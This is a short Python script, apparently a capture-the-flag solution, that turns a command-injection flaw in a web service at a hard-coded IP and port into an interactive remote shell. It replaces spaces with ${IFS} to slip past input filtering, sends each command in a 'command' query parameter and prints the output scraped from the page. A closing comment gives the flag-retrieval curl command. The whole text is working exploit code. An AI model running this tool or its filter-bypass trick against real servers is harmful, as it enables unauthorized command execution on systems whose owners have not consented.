import readline
import requests as rq

url = 'http://46.101.39.71:31747'

while True:
	cmd = input('> ')
	cmd = cmd.replace(' ', '${IFS}')
	cmd = f'"{cmd}"'
	res = rq.get(url, params={'command': cmd}).text
	start = '<pre>'
	end   = '</pre>'
	output = res[res.find(start)+len(start):res.find(end)]
	print(output)

# Flag: curl 127.0.0.1:3000/get_flag
